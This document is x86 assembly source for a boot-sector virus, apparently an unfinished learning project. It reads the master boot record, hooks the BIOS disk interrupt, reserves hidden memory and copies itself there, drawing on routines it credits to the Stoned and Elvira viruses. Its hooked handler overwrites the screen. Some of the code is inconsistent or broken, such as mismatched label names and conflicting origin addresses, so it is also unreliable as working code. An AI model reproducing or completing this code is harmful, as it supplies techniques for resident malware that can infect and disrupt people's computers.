bits 16

org 0x100

vxloader:
	jmp 	VX_BOOT
;******************************************************************************
;*	
;*BOOT_JMP_S
;*
;*
;*
;******************************************************************************


BOOT_JMP_ADR equ 	$
BOOT_JMP_S	 =		$
BOOT_JMP_O	dw 		$-himem_jmp


;******************************************************************************
;	Read MBR from hard disk drive C:, Cylinder 0, Head 0, Sector 1
;	and save it to BUF at end of this code
;******************************************************************************
copy_mbr:
	mov ax, 0x201	;read one sector of disk
	mov	cx, 1
	mov dx, 0x80 	;from Side 0, drive C:
	lea bx, BUF		;to buffer BUF in DS
	int 13h


;******************************************************************************
;	Write back to hard disk drive C: sector 1 (MBR)
;******************************************************************************
	;mov ax,0x0301
	;mov bx,0x200
	;int 13h



OG_13:
db	0EAh			;from Spanska Elvira, EAh is far call
_ORIG_INT13	dd	? 	;this is also such a nice trick bc it avoids having to define these in a data segment
iret 				;so there is no need to change the segment for loading cs w the correct value

hook_int13:
	push 	ds
	push 	ax	
	cmp		ax, 2
	jb 		no_new_INT13

	cmp		ax, 4
	jnb 	no_new_INT13
	pushf
	
vx_int13_handler:
	push 	ax
	push 	bx
	push	cx
	push	dx
	push	ds
	push	es
	push	si
	push	di
	;mov 	cx, cs
	;mov	ds, cx
	
	cli
	mov	ax, 0013h
	int	10h
	mov	ax,0xA000
	mov	es,ax
	;mov	ds,ax
	mov	di,0
	mov	cx, (6400/2)
	mov	ax,0202h
	cld
	repnz	stosw

	sti
	pop 	di
	pop		si
	pop		es
	pop		ds
	pop		dx
	pop		cx
	pop		bx
	pop		ax
	popf
	
no_new_INT13:
	push	ax
	mov	al, 0x20
	out	0x20, al
	pop	ax
	pop ax
	pop ds
	jmp	OG_INT13

org 0x7c00

VX_BOOT:
cli
xor 	ax,ax
mov 	ds,ax
mov 	es,ax
mov 	ss,ax
mov		sp, $-VX_BOOT
sti
;mov 	si,msg
;cld

install_vx_int13:
	es les bx,[0x13*4]			;int 0x13 handler is at address 0000:004C (0x13*4)
	mov ds:[_ORIG_INT_13], bx
	mov ds:[_ORIG_INT_13+2], es

;******************************************************************************
;	Subtract 12k from memory available (stored in var in Bios Parameter Block)	
;******************************************************************************
carve_12kmem:
	mov ax, ds:[0x413]
	sub ax, 12
	mov ds:[0x413], ax

;******************************************************************************
;	Retrieve segment of carved mem area
;	*Using technique/routine from Stoned
;******************************************************************************
	mov cl, 6
	shl	 ax, cl 				;I'm not actually sure why there's 
								;a mov and then a shl w/ the immediate here,
	mov [BOOT_JMP_S], ax 		;rather than just using a "shl ax, 6"
								;maybe AV reasons??

	mov es, ax
	lea ax, hook_int13
	mov	[0x4C], ax
	mov	[0x4C+2], es
;******************************************************************************
;	Now copy virus to carved mem area (ES:0000)
;	*Using technique/routine from Stoned
;******************************************************************************
	mov cx, $-vx_fin
	push cs
	pop ds
	xor di, di
	mov si, di
	cld
	rep movsb



	

himem_jmp:	
lea si, $-msg

ch_loop:
	lodsb
	or 	al,al
	jz	hang
	mov	ah, 0x0E
	mov	bh, 0
	int 0x10
	jmp	ch_loop

hang:
	jmp hang

msg	db 'Hello from the other side',13,10,0
	
partition_table:
	times 64-($-$$) db 0
	;times 510-($-$$) db 0
	db 0x55
	db 0xAA


BUF:
	times 512-($-$$) db 0
	
vx_fin	equ $

